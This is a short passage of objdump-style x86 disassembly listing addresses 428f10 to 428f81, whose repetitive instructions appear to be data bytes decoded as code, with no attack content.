  428f10:	mov    ds:0xbc00028b,al
  428f15:	mov    eax,DWORD PTR [edx]
  428f17:	add    ah,dl
  428f19:	mov    eax,DWORD PTR [edx]
  428f1b:	add    ah,ch
  428f1d:	mov    eax,DWORD PTR [edx]
  428f1f:	add    dl,bh
  428f21:	mov    eax,DWORD PTR [edx]
  428f23:	add    BYTE PTR [esi],al
  428f25:	mov    WORD PTR [edx],es
  428f27:	add    BYTE PTR [eax],bl
  428f29:	mov    WORD PTR [edx],es
  428f2b:	add    BYTE PTR [eax],al
  428f2d:	add    BYTE PTR [eax],al
  428f2f:	add    BYTE PTR [eax],bh
  428f31:	mov    WORD PTR [edx],es
  428f33:	add    BYTE PTR [edx-0x74],al
  428f36:	add    al,BYTE PTR [eax]
  428f38:	push   eax
  428f39:	mov    WORD PTR [edx],es
  428f3b:	add    BYTE PTR [esp+ecx*4+0x2],bl
  428f3f:	add    BYTE PTR [esp+ecx*4+0x2],ch
  428f43:	add    BYTE PTR [edx-0x74],bh
  428f46:	add    al,BYTE PTR [eax]
  428f48:	xchg   BYTE PTR [edx+eax*1+0x28c9000],cl
  428f4f:	add    BYTE PTR [edx-0x47fffd74],ah
  428f55:	mov    WORD PTR [edx],es
  428f57:	add    dh,cl
  428f59:	mov    WORD PTR [edx],es
  428f5b:	add    ah,ah
  428f5d:	mov    WORD PTR [edx],es
  428f5f:	add    ah,dh
  428f61:	mov    WORD PTR [edx],es
  428f63:	add    BYTE PTR [ecx*4-0x72ebfffe],al
  428f6a:	add    al,BYTE PTR [eax]
  428f6c:	and    cl,BYTE PTR [ebp-0x72c5fffe]
  428f72:	add    al,BYTE PTR [eax]
  428f74:	inc    esp
  428f75:	lea    eax,[edx]
  428f77:	add    BYTE PTR [eax-0x73],dl
  428f7a:	add    al,BYTE PTR [eax]
  428f7c:	pop    esi
  428f7d:	lea    eax,[edx]
  428f7f:	add    BYTE PTR [eax],al
  428f81:	add    BYTE PTR [eax],al
	...
